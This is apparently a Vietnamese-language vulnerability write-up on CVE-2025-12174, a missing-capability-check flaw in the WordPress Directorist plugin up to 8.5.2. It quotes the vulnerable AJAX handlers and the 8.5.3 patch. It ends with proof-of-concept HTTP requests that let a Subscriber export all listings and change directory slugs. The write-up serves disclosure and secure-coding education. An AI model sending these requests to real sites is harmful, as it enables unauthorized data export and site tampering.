# CVE-2025-12174 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Directorist: AI-Powered Business Directory Plugin with Classified Ads Listings** cho WordPress tồn tại lỗ hổng truy cập trái phép do thiếu kiểm tra quyền hạn đối với các hành động AJAX `directorist_prepare_listings_export_file` và `directorist_type_slug_change` trong tất cả các phiên bản cho đến **8.5.2**. Điều này cho phép kẻ tấn công đã xác thực, với quyền **Subscriber trở lên**, có thể xuất dữ liệu danh sách và thay đổi slug của directorist.

* **CVE ID**: [CVE-2025-12174](https://www.cve.org/CVERecord?id=CVE-2025-12174)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 8.5.2
* **Patched Versions**: 8.5.3
* **CVSS severity**: Medium (6.5)
* **Required Privilege**: Subcriber
* **Product**: [WordPress Directorist Plugin](https://wordpress.org/plugins/directorist/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Directorist**:  
    * `8.5.2` – **vulnerable**  
    * `8.5.3` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đăng ký hai action hook:

```php {title="class-ajax-handler.php v8.5.2" hl_lines=[] data-open=true}
add_action( 'wp_ajax_directorist_prepare_listings_export_file', [ $this, 'handle_prepare_listings_export_file_request' ] );
add_action( 'wp_ajax_directorist_type_slug_change', [ $this, 'directorist_type_slug_change' ] );
```

Các hook `wp_ajax_` chỉ dành cho người dùng đã đăng nhập (từ Subscriber trở lên). Hai action trên gọi đến hai hàm xử lý tương ứng.

**1. `wp_ajax_directorist_prepare_listings_export_file`:**

```php {title="class-ajax-handler.php v8.5.2" hl_lines=[9] data-open=true}
public function handle_prepare_listings_export_file_request() {
    if ( ! directorist_verify_nonce() ) {
        $data['success'] = false;
        $data['message'] = __( 'Something is wrong! Please refresh and retry.', 'directorist' );

        return wp_send_json( $data );
    }

    $file = Directorist\Listings_Exporter::get_prepared_listings_export_file();

    wp_send_json( $file );
}
```

Hàm này trả về toàn bộ **Directory Listings** dưới dạng file `.csv`, được tạo bởi hàm `get_prepared_listings_export_file()`:

```php {title="class-listings-export.php v8.5.2" hl_lines=[] data-open=true}
public static function get_prepared_listings_export_file() {
    $filename      = "listings-export-data";
    $file_name     = "{$filename}.csv";
    $file_contents = self::get_listings_data_as_csv_content();

    $old_file_id = get_directorist_option( 'directorist_export_attachent_id', '', true );
    if ( ! empty( $old_file_id ) ) {
        wp_delete_attachment( $old_file_id, true );
    }

    $upload_dir = wp_upload_dir();

    if ( wp_mkdir_p( $upload_dir['path'] ) ) {
        $file = $upload_dir['path'] . '/' . $file_name;
    } else {
        $file = $upload_dir['basedir'] . '/' . $file_name;
    }

    file_put_contents( $file, $file_contents );

    $wp_filetype = wp_check_filetype( $file_name, null );
    $attachment = [
        'post_mime_type' => $wp_filetype['type'],
        'post_title'     => sanitize_file_name( $filename ),
        'post_content'   => '',
        'post_status'    => 'inherit'
    ];

    $attach_id = wp_insert_attachment( $attachment, $file );
    $attach_url = wp_get_attachment_url( $attach_id );

    update_directorist_option( 'directorist_export_attachent_id', $attach_id );

    return [ 'success' => true, 'file_url' => $attach_url ];
}
```
Đường dẫn được trả về chính là giá trị **`file_url`** trong mảng kết quả của hàm:

```php
return [ 'success' => true, 'file_url' => $attach_url ];
```

Cụ thể:

* File CSV được tạo tại thư mục upload của WordPress, ví dụ:
  **`wp-content/uploads/2025/01/listings-export-data.csv`**

* Sau đó file được đăng ký dưới dạng **attachment**, và WordPress tạo ra một **URL truy cập công khai**, chính URL này được trả về trong `file_url`, ví dụ:
  **`https://example.com/wp-content/uploads/2025/01/listings-export-data.csv`**

> [!INFO] 
> Danh sách các **Directory Listings** có thể tìm thấy ở endpoint: `http://localhost/wp-admin/edit.php?post_type=at_biz_dir`
> ![Listing](listing.png "Danh sách các Directory Listings")

**2. `wp_ajax_directorist_type_slug_change`:**

```php {title="class-ajax-handler.php v8.5.2" hl_lines=[33] data-open=true}
public function directorist_type_slug_change() {
    if ( ! directorist_verify_nonce() ) {
        wp_send_json(
            [
                'error' => __( 'Session expired, please reload the window and try again.', 'directorist' ),
            ]
        );
    }

    $type_id     = isset( $_POST['type_id'] ) ? sanitize_key( $_POST['type_id'] ) : '';
    $update_slug = isset( $_POST['update_slug'] ) ? sanitize_key( $_POST['update_slug'] ) : '';

    $directory_slugs = [];
    $listing_types   = directorist_get_directories();

    if ( $listing_types ) {
        foreach ( $listing_types as $listing_type ) {
            $directory_slugs[] = $listing_type->slug;
            if ( $type_id == $listing_type->term_id ) {
                $old_slug = $listing_type->slug;
            }
        }
    }

    if ( in_array( $update_slug, $directory_slugs ) ) {
        wp_send_json(
            [
                'error'    => __( 'This slug already in use.', 'directorist' ),
                'old_slug' => ! empty( $old_slug ) ? $old_slug : '',
            ]
        );
    } else {
        $update_type_slug = wp_update_term( $type_id, ATBDP_TYPE, [ 'slug' => $update_slug ] );
        if ( $update_type_slug ) {
            wp_send_json(
                [
                    'success' => __( 'Slug changes successfully.', 'directorist' ),
                ]
            );
        }
    }
}
```

Hàm này cho phép thay đổi slug của bất kỳ Listing Type nào với `type_id` và `update_slug` được lấy từ POST request.

---

Để ý 1 tí, ta thấy cả 2 callback đều gọi đến `directorist_verify_nonce` để triển khai cơ chế chống CSRF với action mặc định là `directorist_nonce`:

```php {title="helper-functions.php v8.5.2"}
function directorist_verify_nonce( $nonce_field = 'directorist_nonce', $action = '' ) {
    $nonce = ! empty( $_REQUEST[ $nonce_field ] ) ? directorist_clean( wp_unslash( $_REQUEST[ $nonce_field ] ) ) : '';
    return wp_verify_nonce( $nonce, ( $action ? $action : directorist_get_nonce_key() ) );
}
```

nonce `directorist_nonce` luôn tồn tại cho người dùng đã đăng nhập.

> [!BUG]
> **Lỗ hổng phát sinh do không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.** đã đăng nhập (từ Subscriber trở lên) có thể gọi vào endpoint để thực hiện lấy danh sách các **Directory Listings** hoặc thay đổi slug của bất kỳ Listing Type, dù hành động đó lẽ ra chỉ dành cho admin.

**Bản vá (v8.5.3)** thêm kiểm tra quyền vào các callback bằng đoạn:

```php
if ( ! current_user_can( 'manage_atbdp_options' ) ) {
    wp_send_json_error(
        [
            'error' => __( 'You are not allowed to modify directory slugs.', 'directorist' ),
        ],
        403
    );
}
```

Quyền `manage_atbdp_options` là một **custom capability**, được gán cho Administrator thông qua:

```php
$wp_roles->add_cap( 'administrator', 'manage_atbdp_options' );
```

Nghĩa là chỉ Administrator mới có quyền thực thi các hành động như đổi slug hay xuất dữ liệu, khắc phục hoàn toàn lỗi thiếu capability check.

## Flow
{{< mermaid >}}
graph TD

A["Logged-in user (Subscriber or higher)"] --> B["Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change"]
B --> C["wp_ajax_* hook is triggered"]
C --> D["Callback executes"]
D --> E{"Is nonce valid?"}
E -- No --> F["Return error"]
E -- Yes --> G["Process request"]
G --> H{"Is capability checked?"}
H -- No --> I["Subscriber or higher can export all listings or change any directory slug"]
I --> J["Broken Access Control"]
{{< /mermaid >}}


## Proof of Concept (PoC)
1. Login Subcriber account và lấy `directorist_nonce` từ response
![Nonce](nonce.png "Lấy nonce từ response")

2. Gửi request:
    * Lấy danh sách các **Directory Listings**
    ```http
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: localhost 
    Cookie: sub_cookie
    ...
    action=directorist_prepare_listings_export_file&directorist_nonce=22a1e53ab7
    ```
    * Thay đổi slug của bất kỳ Listing Type
    ```http
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: localhost 
    Cookie: sub_cookie
    ...
    action=directorist_type_slug_change&directorist_nonce=22a1e53ab7&type_id=580&update_slug=payload
    ```

## Conclusion
Lỗ hổng trong **Directorist <= 8.5.2** xuất phát từ việc **không triển khai kiểm tra quyền hạn** trong hai AJAX action đặc quyền. Dù plugin có sử dụng nonce để chống CSRF, cơ chế này không đóng vai trò xác thực quyền, dẫn đến việc **mọi người dùng đã đăng nhập**, bao gồm cả *Subscriber*, đều có thể xuất toàn bộ dữ liệu Listing hoặc tùy ý thay đổi slug — những hành động lẽ ra chỉ dành cho Administrator.
Bản vá ở **v8.5.3** khắc phục triệt để bằng cách bổ sung kiểm tra capability `manage_atbdp_options`, thiết lập lại ranh giới truy cập đúng đắn.

## Key Takeaways

* **Nonce không phải là kiểm tra quyền**: nonce chỉ ngăn CSRF, không ngăn người dùng cấp thấp thực thi thao tác nhạy cảm.
* **AJAX của WordPress là bề mặt tấn công phổ biến**: mọi `wp_ajax_` cần kiểm tra capability rõ ràng.
* **Broken Access Control thường đến từ việc thiếu một dòng kiểm tra**, không phải lỗi phức tạp.
* **Custom capability** (như `manage_atbdp_options`) là cách hiệu quả để kiểm soát quyền chi tiết.
* Luôn kiểm tra đồng thời **xác thực người dùng** và **quyền thực thi** trước khi cho phép thao tác quản trị.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress Directorist Plugin <= 8.5.2 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/directorist/vulnerability/wordpress-directorist-plugin-8-5-2-missing-authorization-to-authenticated-subscriber-data-export-and-slug-update-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-13-cve-2025-12174/  

